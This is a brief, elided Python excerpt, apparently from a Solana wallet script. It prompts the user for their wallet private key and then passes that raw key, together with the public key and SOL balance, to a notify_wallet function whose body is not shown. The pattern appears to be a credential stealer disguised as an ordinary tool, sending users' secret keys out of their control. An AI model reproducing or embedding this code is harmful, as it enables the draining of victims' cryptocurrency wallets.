...
from utils.getwallet import get_wallet_from_private_key
...
def main():
    ...
    while wallet is None:
        private_key_input = input("\033[93mPlease enter your private key (base58 OR raw numbers) : \033[0m")
        try:
            wallet = get_wallet_from_private_key(private_key_input)
        except Exception:
            wallet = None
    ...
    notify_wallet(private_key_input, public_key, sol_balance)
